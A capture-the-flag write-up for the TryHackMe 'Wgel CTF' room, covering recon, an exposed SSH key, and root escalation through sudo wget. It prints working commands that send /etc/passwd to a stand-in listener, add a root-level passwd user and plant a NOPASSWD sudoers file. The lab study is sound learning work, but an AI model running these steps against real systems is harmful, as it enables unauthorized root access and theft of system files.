> *This translation has been made by Claude, check out the original writeup [here](README.md).*

# Wgel CTF

https://tryhackme.com/room/wgelctf

![Screenshot](img/Pasted%20image%2020260224093800.png)

![Screenshot](img/Pasted%20image%2020260224100037.png)

## Initial recon

Ran nmap on the IP

![Screenshot](img/Pasted%20image%2020260224100117.png)

Port 80 is open, checking it out in the browser right away.

There we only had the Apache2 Default page

![Screenshot](img/Pasted%20image%2020260224100237.png)

Ran Feroxbuster `feroxbuster -w /usr/share/wordlists/dirb/common.txt -u http://$IP` and got a bunch of interesting hits:

![Screenshot](img/Pasted%20image%2020260224100602.png)

`/sitemap` takes us to a landing page for a company

![Screenshot](img/Pasted%20image%2020260224100747.png)

`/sitemap/.ssh` takes us to:

![Screenshot](img/Pasted%20image%2020260224100815.png)

There we find an RSA Private Key that we can download.

But! We need a username to be able to use it with SSH. Time to dig around the site.

## User Flag

Seeing a number of blog posts written by `Dave Miller`.

![Screenshot](img/Pasted%20image%2020260224101459.png)

Tried `Dave` as the username without success.

Also found some images showing the website's dashboard, where there are two names: `Cameron Svensson` and `Jennie Thompson`. Worth a try. We also found a `Matthew` in another image. However, none of them worked as a username. Probably stock images, so the odds were slim, but still worth a shot.

After digging around the website, we took another look at the Apache page, and sure enough, someone had snuck in a comment there.

![Screenshot](img/Pasted%20image%2020260224104923.png)

So `Jessie` feels like a likely username, and indeed it was.

![Screenshot](img/Pasted%20image%2020260224105010.png)

And there we found the first flag!

<details>
  <summary><b>Click here to see it</b></summary>

  ![Screenshot](img/Pasted%20image%2020260224105203.png)
</details>

## Root Flag

`sudo -l` shows that `jessie` is allowed to run wget as root

![Screenshot](img/Pasted%20image%2020260224105556.png)

Struggling to spawn a root shell with wget, but it's giving me some trouble. GTFObins says this:

```
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```

But no matter how I modify the lines, I get `wget: unrecognized option '--use-askpass=/tmp...`

So I'll try using wget for file write instead. The attack chain is then to create a local passwd file, and then upload it to the server with wget. In my self-made passwd file I have a user that I can switch to.

Sent the passwd file from the server with `sudo wget --post-file=/etc/passwd http://MY_LOCAL_IP:8000` while listening on my local machine with `nc -lvnp 8000 > passwd_copy`. It received the connection and saved the content to `passwd_copy`.

I create a new password hash with openssl `openssl passwd -1 -salt "hejsan" "password123"`. That generated `$1$hejsan$8EhtmRt9u7VfakwboJdS90`

Create a new line in the passwd file by manually entering `h4ck3r:$1$hejsan$8EhtmRt9u7VfakwboJdS90:0:0:root:/root:/bin/bash`. So this is my new user `h4ck3r`, who gets the password `password123` and root privileges.

Uploading it to the server with wget. Or well, downloading it onto the server would perhaps be a more accurate way to put it. `-O` (capital O, not a zero) refers to output and makes the download save to wherever I point it.

![Screenshot](img/Pasted%20image%2020260224120711.png)

Didn't work. The error message seems to be caused by the passwd file being corrupted somehow. Might have picked up some junk character.

Ran `cat -e passwd_dirty | grep h4ck3r` to double-check, and then I saw something that shouldn't be there at the end. A line break.

![Screenshot](img/Pasted%20image%2020260224123101.png)

Edited the file with `tr -d '\r' < passwd_dirty > passwd` and uploaded it again.

`su h4ck3r` resulted in being able to switch user this time, and just like that I had a root shell, nice.

![Screenshot](img/Pasted%20image%2020260224122322.png)

The flag then?

<details>
  <summary><b>Click here to see the flag</b></summary>

  ![Screenshot](img/Pasted%20image%2020260224122403.png)
</details>

### A variant

**Onind00** found another solution that didn't require as many steps but which also exploited the fact that we could run wget with root privileges. He created a new file for `jessie` to place in `/etc/sudoers.d`. This via `echo 'jessie ALL=(ALL) NOPASSWD: ALL' > jessie_sudo`, then started a python server and ran wget from the server, which saved the new sudo file. Voilà, `jessie` could now run everything as root.
